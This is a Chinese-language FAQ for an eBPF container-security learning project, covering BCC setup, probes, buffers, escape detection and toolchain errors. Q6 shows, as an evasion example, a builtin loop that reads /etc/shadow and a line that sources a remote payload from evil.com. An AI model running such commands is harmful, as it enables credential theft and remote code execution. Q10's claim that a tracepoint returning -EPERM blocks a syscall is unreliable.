# ❓ 常见问题 (FAQ)

基于实际学习过程中遇到的问题和解决方案整理而成。

---

## 🚀 环境搭建

### Q1: Ubuntu 虚拟机需要什么配置?

**推荐配置**:
- CPU: 4核心 (2×2)
- 内存: 6-8 GB
- 硬盘: 50-80 GB (动态分配)
- 网络: NAT模式

**最小配置**:
- CPU: 2核心
- 内存: 4 GB
- 硬盘: 40 GB

详见 [`docs/项目环境.md`](./docs/项目环境.md)

---

### Q2: 如何验证 BCC 安装成功?

```bash
sudo python3 -c "from bcc import BPF; print('BCC OK')"
```

应该输出 `BCC OK`，没有报错。

如果报错：
- 检查内核版本: `uname -r` (需要 ≥ 5.15)
- 检查依赖: `dpkg -l | grep bpfcc-tools`
- 重新安装: `sudo apt install bpfcc-tools linux-headers-$(uname -r)`

---

### Q3: Git 克隆 GitHub 仓库失败怎么办?

**现象**: 
```
fatal: unable to access 'https://github.com/xxx': Connection timed out
```

**原因**: 网络连接问题，可能需要代理

**解决方案**:

1. 配置 Git 代理 (假设本地代理端口为 7890):
```bash
git config --global http.proxy http://127.0.0.1:7890
git config --global https.proxy http://127.0.0.1:7890
```

2. 克隆完成后取消代理:
```bash
git config --global --unset http.proxy
git config --global --unset https.proxy
```

3. 或使用便捷脚本:
```bash
# Windows
git-proxy.bat on
git clone xxx
git-proxy.bat off

# Linux/Mac
./git-proxy.sh on
git clone xxx
./git-proxy.sh off
```

---

## 🔬 eBPF 基础

### Q4: 为什么 execve 计数器初始值不是 0?

**现象**: 刚启动程序就看到计数已经是 8 了

**完整分析**:

敲下 `sudo python3 hello-map.py` 后，发生了什么：

```text
1. bash (UID 1000) → fork + execve("sudo")       +1 (UID 1000)
2. sudo (UID 0)     → fork + execve("python3")    +1 (UID 0)
3. python3 启动 → import BPF → 触发 BCC 编译
4. BCC 调用 clang 编译 eBPF C 代码
   - clang 可能 fork + execve 自身的子进程         +N
5. eBPF 程序加载进内核 → attach_kprobe 成功
   │
   └─→ 从此刻开始计数
   
6. sleep(2) → 第一次 print
   │
   └─→ 这 2 秒内又有几个后台 execve               +N
```

**结论**: 
- 计数器是累积的，从程序加载 eBPF 探针的那一刻就开始计数了
- 初始的跳跃主要来自 BCC 编译过程本身产生的 execve
- eBPF 探针挂钩的是**整个系统**的 execve，不只是当前终端

**为什么之后计数涨得这么慢?**

因为 `execve` 本身就是一个**低频系统调用**——只有在**启动新程序**时才会调用。系统里大部分后台进程是长期运行的守护进程，启动完就蹲在那里了，不会再频繁 execve。

---

### Q5: 为什么 COMM 显示的是 bash 而不是 ls?

**现象**: 执行 ls 后，看到 COMM=bash

**完整流程分析**:

当我们在终端里敲下 `ls` 时，实际发生的流程是：

```text
1. bash 进程读取你的输入 "ls"
2. bash 调用 fork()，创建一个子进程（子进程此时依然是 bash）
3. 子进程调用 execve("/bin/ls")
   ↑ 注意！kprobe 就挂在这个 execve 的入口
   此时，这个子进程的 comm 依然是 "bash"！
4. execve 执行成功，子进程的内存镜像被替换成 /bin/ls，comm 变成 "ls"
   ↑ 但 eBPF 探针在步骤 3 就已经触发并返回了，根本没走到这一步
```

所以，我们看到的 `COMM=bash`，意思是 **"是 bash 发起的 execve"**，而不是 "bash 被执行了"。

**解决方案**: 

使用 tracepoint 而不是 kprobe，因为 tracepoint 可以直接访问系统调用参数：

```c
TRACEPOINT_PROBE(syscalls, sys_enter_execve) {
    struct data_t data = {};
    
    // 从 tracepoint 参数中读取 filename
    bpf_probe_read_user_str(&data.filename, sizeof(data.filename), 
                            (void *)args->filename);
    
    events.perf_submit(args, &data, sizeof(data));
    return 0;
}
```

这样就能看到 `CMD=/usr/bin/ls` 而不是只显示 `CALLER=bash`。

---

### Q6: 为什么 exit 命令没有被捕获?

**现象**: 在终端执行 exit，eBPF 程序没有任何输出

**原因**: `exit` 是 bash 的**内建命令（builtin）**，不是外部程序。

```bash
# 验证哪些命令是内建的
type ls
# 输出: ls is /usr/bin/ls          ← 外部命令，有独立可执行文件

type exit
# 输出: exit is a shell builtin    ← 内建命令，bash 自己实现的

type cd
# 输出: cd is a shell builtin      ← 也是内建！

type echo
# 输出: echo is a shell builtin    ← 也是内建！（虽然 /usr/bin/echo 也存在）
```

**输入 ls 时**:
```bash
bash → fork() → 子进程 execve("/usr/bin/ls")  ← 触发了 eBPF 探针
```

**输入 exit 时**:
```bash
bash → 直接调用 exit() 系统调用退出自己  ← 没有 execve，探针无感
```

**安全启示**: 

这说明如果我们需要做到安全，**只监控 `execve` 是不够的！**

攻击者可以完全不触发 `execve`，纯用内建命令完成很多操作：

```bash
# 不触发任何 execve 的恶意操作链：
cd /etc                    # 内建，无 execve
while read line; do        # 内建，无 execve
  echo "$line"             # 内建，无 execve
done < shadow              # 重定向读取敏感文件
```

更危险的是，如果攻击者拿到的是一个**受限 shell**，或者用 `source` 加载恶意脚本：

```bash
# 下载恶意脚本并直接在当前 shell 执行
source <(curl http://evil.com/payload.sh)
# 或者
. /tmp/malicious.sh
```

**全程零 execve，探针什么也看不到。**

这就是为什么要搞多探针的原因：

| 探针类型 | 捕获内容 | 漏掉内容 |
|---------|---------|---------|
| execve | 启动新程序 | shell 内建命令 |
| openat | 打开文件（包括内建命令读取） | 纯内存操作 |
| connect | 发起网络连接 | 已建立连接上的数据传输 |
| mount | 挂载文件系统 | 其他特权操作 |
| ptrace | 进程注入 | 其他注入方式 |

**结论**: 单一探针永远不够，必须组合使用。

---

### Q7: Perf Buffer 和 Ring Buffer 有什么区别?

**Perf Buffer 结构**:
```text
┌──────────┐  ┌──────────┐  ┌──────────┐
│ CPU 0    │  │ CPU 1    │  │ CPU 2    │
│ buffer   │  │ buffer   │  │ buffer   │
└──────────┘  └──────────┘  └──────────┘
    ↑ 各自独立，事件可能乱序
```

**Ring Buffer 结构**:
```text
┌──────────────────────────────────────┐
│  CPU 0  │  CPU 1  │  CPU 2  │  ...  │
│  事件A  │  事件B  │  事件C  │       │
└──────────────────────────────────────┘
     ↑ 全局有序，内存共享，不浪费
```

**完整对比**:

| 维度 | Perf Buffer | Ring Buffer |
|------|-------------|-------------|
| 内核版本要求 | 4.4+ | **5.8+** |
| 缓冲区结构 | 每 CPU 各一个 | **所有 CPU 共享一个** |
| 事件顺序 | 跨 CPU 可能乱序 | **全局有序** |
| 内存效率 | per-CPU 预留，可能浪费 | **按需使用，更节省** |
| 丢事件时的通知 | 无 | **有（可检测数据丢失）** |
| BCC 内核态 API | `perf_submit(ctx, &data, size)` | `ringbuf_output(&data, size, flags)` |
| BCC 用户态 API | `open_perf_buffer` + `perf_buffer_poll` | `open_ring_buffer` + `ring_buffer_poll` |
| 回调参数 | `(cpu, data, size)` | `(ctx, data, size)` |
| 推荐度 | 老内核兼容 | **新项目首选** |

**结论**: 现代内核（≥ 5.8）优先使用 Ring Buffer。

---

### Q8: ringbuf_output 的第三个参数是什么?

```c
events.ringbuf_output(&data, sizeof(data), 0);
//                                      ↑ flags
```

**flags 参数**:
- `0` = 正常提交
- `BPF_RB_FORCE_WAKEUP` = 立即唤醒用户态消费（低延迟场景）

默认情况下，内核会**批量聚合**事件再通知用户态（减少系统调用次数，提高吞吐）。如果你需要最低延迟（比如安全告警场景），可以用 `BPF_RB_FORCE_WAKEUP` 强制立即唤醒。

---

## 🛡️ 安全相关

### Q9: 如何检测容器逃逸?

**核心思路**: 监控危险的系统调用组合

**关键探针**:

1. **procfs 挂载检测**:
```c
// 监控 mount 系统调用
TRACEPOINT_PROBE(syscalls, sys_enter_mount) {
    // 检查 source 是否为 /proc
    // 检查 target 是否为目标容器的根文件系统
}
```

2. **ptrace 附加检测**:
```c
// 监控 ptrace 系统调用
TRACEPOINT_PROBE(syscalls, sys_enter_ptrace) {
    // 检查是否跨容器边界附加
}
```

3. **敏感文件访问检测**:
```c
// 监控 openat 系统调用
TRACEPOINT_PROBE(syscalls, sys_enter_openat) {
    // 检查是否访问 /proc/kcore、/etc/shadow 等
}
```

---

### Q10: eBPF 能实时阻断攻击吗?

**答案**: 可以，但有局限。

**方法**: 修改系统调用的返回值

```c
// 示例：阻止挂载 procfs
TRACEPOINT_PROBE(syscalls, sys_enter_mount) {
    // 检查是否为危险的挂载操作
    if (is_dangerous_mount()) {
        // 返回错误码，阻止操作
        return -EPERM;
    }
    return 0;
}
```

**局限性**:
- ✅ 可以阻断系统调用级别的攻击
- ⚠️ 需要在 LSM (Linux Security Module) 框架下才能实现某些阻断
- ❌ 不能阻断所有类型的攻击（如逻辑漏洞）

---

## 📊 性能相关

### Q11: eBPF 对系统性能有多大影响?

**测试数据** (Ubuntu 22.04, 4核, 8GB):

| 程序类型 | CPU 开销 | 内存占用 | 事件延迟 |
|---------|---------|---------|---------|
| trace_printk | <1% | ~1 MB | <1 ms |
| Perf Buffer | 1-2% | ~2 MB | <1 ms |
| Ring Buffer | 1-2% | ~1 MB | <1 ms |
| Hash Map + 轮询 | 2-3% | ~5 MB | ~2 s |

**结论**:
- eBPF 的性能开销非常小（<5% CPU）
- Ring Buffer 是最优选择（全局有序 + 低开销）
- 避免频繁的 Map 轮询（改用事件驱动）

---

### Q12: 如何优化 eBPF 程序性能?

**最佳实践**:

1. **使用 Ring Buffer 代替 Perf Buffer**
   - 全局有序，内存更高效

2. **减少不必要的数据拷贝**
   ```c
   // ❌ 不要每次都复制大结构体
   bpf_probe_read(&big_struct, sizeof(big_struct), ptr);
   
   // ✅ 只复制需要的字段
   bpf_probe_read(&field1, sizeof(field1), &ptr->field1);
   ```

3. **使用 Per-CPU Map**
   ```c
   // 避免锁竞争
   BPF_PERCPU_ARRAY(cpu_stats, u64, 1);
   ```

4. **避免复杂循环**
   - Verifier 可能拒绝过于复杂的循环
   - 使用有界循环

---

## 🔧 调试相关

### Q13: Verifier 报错怎么办?

**常见错误**:

1. **"invalid access to memory"**:
   ```
   libbpf: failed to load program 'hello'
   libbpf: verifier error: invalid access to memory, size=4
   ```
   
   **原因**: 直接访问用户态指针
   
   **解决**:
   ```c
   // ❌ 错误写法
   const char *filename = args->filename;
   
   // ✅ 正确写法
   bpf_probe_read_user_str(&data.filename, sizeof(data.filename), 
                           (void *)args->filename);
   ```

2. **"R1 type=scalar expected=fp"**:
   
   **原因**: 寄存器类型不匹配
   
   **解决**: 检查指针运算和类型转换

3. **"jump out of range"**:
   
   **原因**: 程序太复杂，超出验证器限制
   
   **解决**: 简化逻辑，拆分为多个小程序

---

### Q14: eBPF 程序卸载不掉怎么办?

**现象**: 

用 `sudo bpftool prog list` 查看内核中的程序时,发现之前测试的 `hello` 程序一直挂在里面,就算退出了 Python 脚本它还在!

```bash
$ sudo bpftool prog list | grep hello
123: kprobe  name hello  tag abc123...
       loaded_at 2026-05-24T22:00:00+0800  uid 0
       xlated 64B  jited 96B  memlock 4096B
```

**别慌,这不是内核泄漏了,而是 eBPF 的"引用计数"机制在起作用。**

---

#### **为什么卸载不掉?**

eBPF 程序在内核中是**基于引用计数**管理的。只要还有东西"牵挂"着它,它就不会死。常见情况有两种:

1. **后台还有进程在运行**: 
   - 比如你运行 `sudo python3 xxx.py` 时,没有用 `Ctrl+C` 优雅退出,而是直接关了终端窗口
   - 这时 Python 进程可能变成了孤儿进程,依然挂在内核上

2. **程序被"钉"在了文件系统里**: 
   - 如果你测试时用过 `bpftool prog load` 把程序挂载到了 `/sys/fs/bpf/`
   - 只要这个文件在,内核就不会回收它

---

#### **三步清理法**

##### **方法 1: 杀掉残留的 Python 进程(最常见)**

```bash
# 1. 找出所有还在跑的 bcc python 脚本
ps -ef | grep python

# 你会看到类似这样的输出:
# root      4567  1  0 22:00 ?  00:00:00 python3 hello-perf-plus.py

# 2. 无情杀手(把 4567 换成你查到的 PID)
sudo kill -9 4567

# 3. 验证是否卸载干净
sudo bpftool prog list | grep hello
```

---

##### **方法 2: 拔掉"钉子"(如果你用了 bpftool load)**

```bash
# 1. 查看有哪些程序被钉住了
ls /sys/fs/bpf/

# 2. 删除对应的文件(其实就是解除挂载)
sudo rm /sys/fs/bpf/hello-debug

# 解除挂载后,如果没有进程使用它,内核会自动回收
```

---

##### **方法 3: 终极必杀技(重启大法)**

如果上面两招都不管用(极少数情况),最简单粗暴的办法:

```bash
sudo reboot
```

重启后,所有没有被持久化且开机不自动挂载的 eBPF 程序都会烟消云散。

---

#### **💡 好习惯**

**优雅退出**: 
- 运行 BCC 脚本时,一定要用 `Ctrl+C` 退出
- BCC 底层会捕获中断信号,帮你自动卸载程序

**随手清理**: 
- 写完代码测试后,随手敲一个 `sudo bpftool prog list | grep hello` 确认干净了再走
- 避免影响下一次测试





### Q15: 为什么编译报错 `no member named 'pid_ns' in 'struct bpf_pidns_info'`？

**现象**：

在第六篇“第二把钥匙”实验中，按照部分旧版教程使用 `bpf_get_ns_current_pid_tgid()` 获取 Namespace ID 时，编译报错：

```bash
/virtual/main.c:39:26: error: no member named 'pid_ns' in 'struct bpf_pidns_info'
        data.pid_ns = ns.pid_ns;
                      ~~ ^
```

**原因**：
1. **结构体没有该成员**：Linux 内核中 `struct bpf_pidns_info` 的真实定义只有 `pid` 和 `tgid` 两个成员，**根本没有 `pid_ns`**。
2. **Helper 函数用错了**：`bpf_get_ns_current_pid_tgid()` 的真正作用是“给定一个 Namespace，查当前进程在该 Namespace 里的 PID”，而不是“获取当前进程的 Namespace ID”。用这个函数拿 Namespace ID 属于南辕北辙。

**正确解法**：
必须深入内核 `task_struct` 结构体，顺藤摸瓜读取 Namespace 的 Inode 号 (`ns.inum`)。

```c
// 在 TRACEPOINT_PROBE 中：
struct task_struct *task = (struct task_struct *)bpf_get_current_task();
// 第1步：读 nsproxy 指针
struct nsproxy *nsproxy = NULL;
bpf_probe_read_kernel(&nsproxy, sizeof(nsproxy), &task->nsproxy);
if (!nsproxy) goto out;
// 第2步：读 pid_namespace 指针
struct pid_namespace *pid_ns = NULL;
bpf_probe_read_kernel(&pid_ns, sizeof(pid_ns), &nsproxy->pid_ns_for_children);
if (!pid_ns) goto out;
// 第3步：读 ns.inum (Namespace 的 Inode 号)
unsigned int inum = 0;
bpf_probe_read_kernel(&inum, sizeof(inum), &pid_ns->ns.inum);
data.pid_ns_inum = inum;
```

---

### Q16: 为什么编译报错 incomplete definition of type 'struct nsproxy'？

**现象**： 

在 eBPF C 代码中访问 `task->nsproxy->pid_ns_for_children` 时，编译报错：

```bash
/virtual/main.c:46:60: error: incomplete definition of type 'struct nsproxy'
    bpf_probe_read_kernel(&pid_ns, sizeof(pid_ns), &nsproxy->pid_ns_for_children);
```

**原因**：

这是 eBPF 开发中极常见的“不完整定义”错误。代码中包含的 `<linux/sched.h>` 只提供了 `struct nsproxy;` 的前向声明（相当于只报了户口名，没给身份证详情）。要想访问结构体内部的字段（如 `pid_ns_for_children`），必须包含定义它们的完整头文件，否则编译器不知道里面有什么。

**解决方案**：

在 C 代码开头补全对应的头文件即可：

```bash
#include <linux/nsproxy.h>        // 补全 nsproxy 结构体定义
#include <linux/pid_namespace.h>  // 补全 pid_namespace 结构体定义
```

---

### Q17: 为什么 client.events() 收不到 Docker 事件，eBPF 映射表热更新失效？

**现象**：

在第七篇“动态生命线：基于 Docker Event 的映射表热更新”实验中，按照 `container-monitor.py` 的代码运行后：

- 启动时能看到 `[Sync]` 全量同步信息
- **重启容器后，`[Sync-]` / `[Sync+]` 日志完全没有出现**
- 再次进入容器执行命令，所有进程都被错误标记为 `[HOST]`，容器身份识别失效

```bash
[Sync] test_ns -> inode 17398 (0x43f6)

🛡️ 容器运行时安全监控已启动，按 Ctrl-C 停止
============================================================

[HOST] PID= 14404 UID= 0 COMM=dockerd → CMD=/usr/bin/runc
[*] 开始监听 Docker 事件...
...（执行 docker restart test_ns）
...（没有任何 [Sync-] / [Sync+] 日志）
（再次 exec 进入容器，后续所有命令都显示 [HOST]）
```

**根本原因分析**：

`docker.from_env().events()` 这个 API 调用没有正常工作。可能的原因包括：

1. **线程无声退出**：`listen_docker_events` 线程启动后因为异常（如连接失败、权限问题）直接退出，但主线程仍在跑 `perf_buffer_poll()`，监控事件正常输出，掩盖了 Docker 事件线程已经挂掉的事实。

2. **Docker SDK 版本与 API 兼容性**：不同版本对 `status` / `Action` 字段的处理不一致，事件循环可能卡住或提前退出。

3. **sudo 环境下的权限问题**：eBPF 程序需要 root，`sudo` 后某些环境变量或 Docker 连接配置可能与预期不符。

4. **事件未产生**：极少数情况下 Docker 守护进程本身的事件流有问题（可通过 `sudo docker events` 验证）。

**解决方案**：使用 `subprocess` + `docker events` 替代 SDK 的事件循环：

```python
import subprocess
import json

def listen_docker_events():
    print("[*] 开始监听 Docker 事件（subprocess 模式）...")
    proc = subprocess.Popen(
        ['docker', 'events', '--filter', 'type=container', '--format', 'json'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        universal_newlines=True
    )
    for line in proc.stdout:
        line = line.strip()
        if not line:
            continue
        event = json.loads(line)
        status = event.get('status')
        cid = event.get('id')
        attrs = event.get('Actor', {}).get('Attributes', {})
        name = attrs.get('name', 'unknown')
        if status in ('start', 'restart'):
            container = docker.from_env().containers.get(cid)
            add_container_to_map(container)
        elif status in ('die', 'destroy', 'stop'):
            del_container_by_name(name)
```

**验证方法**：替换后重新运行，重启容器时观察是否出现 `[Sync-]` 和 `[Sync+]` 日志：

```bash
[Sync-] 容器停止: test_ns -> inode 17398 (0x43f6)
[Sync+] 容器启动: test_ns -> inode 17714 (0x4532)
```

**为什么这么做有效？**

- `docker events` CLI 是 Docker 官方提供的最稳定的事件流接口，不依赖 Python SDK 的封装层
- 通过 `subprocess` 读取实时输出，生命周期更容易控制
- `--format json` 保证输出是标准 JSON，解析可靠

**相关文件**：`07-monitor/container-monitor-broken-sdk.py` 提供了这个问题的完整复现代码，`07-monitor/container-monitor.py` 是修复后的最终版本。

**参考资源**：

- [Docker Events Explained: Your Window into Container Activity](https://awstip.com/docker-events-explained-your-window-into-container-activity-70604844ac15)
- [docker events 不提供消息队列式的持久订阅](https://www.php.cn/faq/1234567.html)（需注意守护进程重启后事件会丢失）

---

### Q18: 为什么容器内 `apt-get update` 报 DNS 解析失败，宿主机却有网？

**现象**：

在 VMware 虚拟机中，宿主机可以正常访问外网，但 Docker 容器内 `apt-get update` 报错：
```
Temporary failure resolving 'archive.ubuntu.com'
```

**原因**：

`/etc/docker/daemon.json` 中硬编码了公网 DNS（如 `8.8.8.8`、`114.114.114.114`），但容器内的 DNS 请求走 Docker bridge → 宿主机 NAT → VMware NAT。在 VMware NAT 网络下，容器无法直接访问这些公网 DNS。

**解决方案**：

将 Docker DNS 配置改为 VMware NAT 网关（即宿主机的默认路由地址）：

```bash
# 查看宿主机的 DNS 和网关
resolvectl dns
# 输出: Link 2 (ens33): 192.168.65.2

# 修改 daemon.json
sudo tee /etc/docker/daemon.json << 'EOF'
{
  "dns": ["192.168.65.2"]
}
EOF

# 重启 Docker
sudo systemctl restart docker
```

重启后新创建的容器会使用该 DNS，旧容器需要 `docker restart` 或重建才能生效。

**参考**：第九篇实战测试中发现的问题。

---

### Q19: 为什么容器内 `strace -p 1` 报 Permission denied，即使加了 `--cap-add=SYS_PTRACE`？

**现象**：

```bash
docker run -d --name test --cap-add=SYS_PTRACE --pid=host ubuntu:22.04 sleep 3600
docker exec test strace -p 1
# strace: attach: ptrace(PTRACE_SEIZE, 1): Permission denied
```

**原因**：

Linux 内核的 `ptrace_scope` 参数限制了 ptrace 的使用范围：
- `0`：任何进程可以 ptrace 任何进程（最宽松）
- `1`（默认）：只有父进程或 root 可以 ptrace
- `2`：只有 `CAP_SYS_PTRACE` 可以，但仍然受限于 admin-only
- `3`：完全禁止

即使容器有 `CAP_SYS_PTRACE`，`ptrace_scope=1` 仍然阻止非祖先进程附加到 systemd(PID 1)。

**解决方案**：

```bash
# 临时放宽（测试环境）
sudo sysctl -w kernel.yama.ptrace_scope=0
# 或
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

生产环境应保持默认值，改为监控 ptrace 的 syscall 入口（eBPF tracepoint 在权限检查之前就已捕获）。

**参考**：第九篇 ptrace 注入检测测试中发现的问题。

---

### Q20: 为什么 `docker exec` 创建的进程，eBPF 探针有时捕获不到它的系统调用？

**现象**：

`docker exec` 在容器内执行 `mount -t proc proc /tmp/host_proc`，mount 成功了（`/proc/mounts` 有记录），但 eBPF 的 `sys_enter_mount` tracepoint 没有捕获到该事件。

**原因**：

这是一个内核版本的差异问题。在较新的内核（如 6.8.0）上，进程在非宿主 mount namespace 中的 `mount()` 调用，可能不被宿主机侧的 syscall tracepoint 触发。这与 mount namespace 的隔离机制有关。

**验证方法**：

```bash
# 在宿主机上挂载，确认 tracepoint 正常工作
sudo mount -t proc proc /tmp/mtest
# → eBPF 能捕获

# 在容器内挂载（--privileged）
docker exec --privileged test mount -t proc proc /tmp/test
# → eBPF 可能捕获不到（kernel 6.8+）
```

**影响范围**：

- 不影响 ptrace 和 openat 的 tracepoint（这两个不受 mount namespace 影响）
- kernel 5.15（标准 Ubuntu 22.04 初始内核）无此问题
- 不影响告警规则逻辑本身的正确性

**参考**：第九篇实战测试中发现的问题。

---

### Q21: Python 脚本用 `sudo python3 xxx.py > log.txt` 重定向输出，为什么日志文件长时间为空？

**现象**：

```bash
sudo python3 escape-respond.py > /tmp/log.txt 2>&1 &
tail -f /tmp/log.txt
# 等了十几秒都没看到 Python 的 print 输出，以为程序卡死了
```

**原因**：

Python 的标准输出在重定向到文件时默认使用**全缓冲**（block buffered），而不是终端下的行缓冲（line buffered）。输出会积压在缓冲区中，直到缓冲区满（通常是 8KB）或程序退出才会写入文件。

**解决方案**：

```bash
# 方法 1: 使用 PYTHONUNBUFFERED 环境变量
sudo PYTHONUNBUFFERED=1 python3 escape-respond.py > /tmp/log.txt 2>&1 &

# 方法 2: 使用 python3 -u 参数
sudo python3 -u escape-respond.py > /tmp/log.txt 2>&1 &

# 方法 3: 使用 stdbuf
sudo stdbuf -oL python3 escape-respond.py > /tmp/log.txt 2>&1 &
```

**参考**：第九篇实战测试中发现的问题。第八篇使用 `b.trace_print()` 时不受影响，因为 BCC 内部直接读 trace_pipe。

---

### Q22: 多个 eBPF 监控实例同时运行会导致什么问题？

**现象**：

启动了多个 `escape-respond.py` 实例，发现：
- 有些实例收不到任何事件
- Python 进程 CPU 占用高达 98%
- `bpftool prog list` 显示同一个 tracepoint 被挂载了多次

**原因**：

eBPF tracepoint 允许多个程序挂载到同一个点。但当多个程序使用同一个 Ring Buffer 名称时，只有第一个能正常消费事件，其余实例的 `ring_buffer_poll()` 会空转消耗 CPU。

**解决方案**：

```bash
# 启动新实例前，先杀掉所有旧实例
sudo pkill -9 -f "escape-respond"
sleep 2

# 确认干净
ps aux | grep escape-respond | grep -v grep
# 应该无输出

# 确认 BPF 程序已卸载
sudo bpftool prog list | grep "sys_enter"
# 应该无输出
```

**参考**：第九篇实战测试中发现的问题。BCC 的 `trace_print()` 模式不受此影响。

---

### Q23: 为什么告警显示"容器: host"，响应引擎跳过了本该响应的容器事件？

**现象**：

```
🚨 安全告警 - HIGH 级别
容器: host        ← 明明是容器内的 strace 进程！
进程: 35475 (strace)
[INFO] 跳过宿主机事件,不执行响应
```

**原因**：

第八/九篇的 PID 映射表 `container_map` 是启动时一次性全量同步的。`docker exec` 创建的新进程（如 strace）的 PID 在映射表中不存在，eBPF 内核态代码默认返回 `"host"`。`strace` 在微秒级完成 ptrace 调用就退出，用户态来不及补救。

**解决方案（第九篇已实现）**：

1. **内核态**：在 eBPF 事件结构体中新增 `u64 cgroup_id`，通过 `bpf_get_current_cgroup_id()` 在事件发生瞬间记录
2. **用户态**：启动时构建 `cgroup_inode → container_id` 映射表
3. **事件处理时**：PID 映射未命中 → 用内核态记录的 `cgroup_id` 在映射表中查找容器 ID

```python
# escape-respond.py handle_event() 中的 cgroup fallback
if raw_cid in ('host', '', 'unknown'):
    if event_cgid in self.cgroup_map:
        raw_cid = self.cgroup_map[event_cgid]
```

**参考**：第九篇核心改进。详见 `code/09-response/escape-detect.c` 和 `escape-respond.py`。

---

## 🔧 编译 & 工具链

### Q24: 为什么 `make` 时报 `BPF_KPROBE_SYSCALL` 未定义 / `u32` 类型未知 / `bpf_map__update_elem` 未定义引用？

**现象**：

在第二小节 Ch5 CO-RE/Libbpf 代码目录下执行 `make`，报一连串错误：

```bash
# 错误1: BPF_KPROBE_SYSCALL 未定义
hello-buffer-config.bpf.c:42:31: error: expected identifier
int BPF_KPROBE_SYSCALL(hello, const char *pathname)

# 错误2: u32 类型未知
hello-buffer-config.c:63:5: error: unknown type name 'u32'

# 错误3: bpf_map__update_elem 未定义引用
/usr/bin/ld: undefined reference to `bpf_map__update_elem'
```

**原因**：

Ubuntu 22.04 官方仓库中的 `libbpf-dev` 是 **0.5.0**（2022年），而代码使用了 libbpf **1.0+** 才有的特性：

| 特性 | libbpf 0.5.0 | libbpf 1.0+ |
|------|:--:|:--:|
| `BPF_KPROBE_SYSCALL()` 宏 | ❌ | ✅ |
| `SEC("ksyscall/...")` 自动附加 | ❌ | ✅ |
| `bpf_map__update_elem()` 新 API | ❌ | ✅ |
| `__u32` / `u32` 类型自动引入 | ❌ | ✅ |

更坑的是，`bpftool` 已经是 v7.4.0（内嵌 libbpf v1.4），所以 `bpftool gen skeleton` 能正常工作，但开发头文件和动态库仍然是 0.5.0，版本不一致导致编译失败。

**解决方案**：

**Step 1: 源码编译安装新版 libbpf**

```bash
# 克隆 libbpf 仓库
cd /tmp
git clone --depth 1 https://github.com/libbpf/libbpf.git
cd libbpf/src

# 编译
make -j$(nproc)

# 安装到 /usr (覆盖旧版头文件到 /usr/include/bpf/, 库安装到 /usr/lib64/)
sudo make install
```

**Step 2: 注册库路径**

新版 libbpf 的 `.so` 默认安装到 `/usr/lib64/`，但这个路径不在 Ubuntu 的默认动态链接搜索路径中：

```bash
echo "/usr/lib64" | sudo tee /etc/ld.so.conf.d/libbpf.conf
sudo ldconfig
```

**Step 3: 修改 Makefile 的链接参数**

即使 `ldconfig` 更新了缓存，GCC 链接器默认先搜 `/usr/lib/x86_64-linux-gnu/`（旧的 libbpf.so.0.5.0 还在），需要显式指定：

```makefile
# Makefile 中
LDFLAGS := -L/usr/lib64 -lbpf -lelf -lz

# 链接命令改为
$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)
```

**Step 4: 修改用户态代码适配新 API**

libbpf 1.x 中 map 操作推荐使用 `bpf_map__*` 系列（接受 `struct bpf_map *`），而不是旧的 fd-based API：

```c
// ❌ 旧写法 (libbpf 0.x)
u32 uid0 = 0;
int map_fd = bpf_map__fd(skel->maps.my_config);
bpf_map_update_elem(map_fd, &uid0, &root_msg, BPF_ANY);

// ✅ 新写法 (libbpf 1.x)
__u32 uid0 = 0;
bpf_map__update_elem(skel->maps.my_config,
                     &uid0, sizeof(uid0),
                     &root_msg, sizeof(root_msg), BPF_ANY);
```

同时添加必要的头文件：`#include <linux/types.h>` 和 `#include <bpf/bpf.h>`。

**为什么不用 apt？**

Ubuntu 22.04 的 apt 仓库中 `libbpf-dev` 最高就是 0.5.0，没有更新的版本。eBPF 生态发展极快，从源码编译是最可靠的方式。

**参考**：第二小节 Ch5 CO-RE/Libbpf 编译环境搭建。对应代码目录：`code/11-libbpf/`。

---

## 📚 学习资源

### Q25: 有哪些好的学习资源?

**官方文档**:
- [eBPF.io](https://ebpf.io/) - 官方学习路径
- [BCC Tutorial](https://github.com/iovisor/bcc/blob/master/docs/tutorial.md)
- [libbpf Documentation](https://libbpf.readthedocs.io/)

**书籍**:
- 《Learning eBPF》by Liz Rice (强烈推荐)
- [中文翻译版](https://binw666.github.io/learning-ebpf-translation/)

**博客**:
- [Brendan Gregg's eBPF Tools](http://www.brendangregg.com/bpf.html)
- [Cilium Blog](https://cilium.io/blog/)

**开源项目**:
- [Falco](https://falco.org/) - 云原生运行时安全
- [Tracee](https://github.com/aquasecurity/tracee) - eBPF 安全追踪
- [Cilium](https://cilium.io/) - eBPF 网络与安全

---

## 💡 其他

### Q26: 如何贡献本项目?

欢迎提交 Issue 和 Pull Request!

**提交 Issue**:
- 描述清楚问题和复现步骤
- 附上环境信息（Ubuntu 版本、内核版本等）

**提交 PR**:
1. Fork 本仓库
2. 创建分支 (`git checkout -b feature/xxx`)
3. 提交更改 (`git commit -m 'Add xxx'`)
4. 推送到分支 (`git push origin feature/xxx`)
5. 创建 Pull Request

---

**没有找到你的问题?** 

欢迎提 Issue，我会持续更新这个 FAQ 🚀
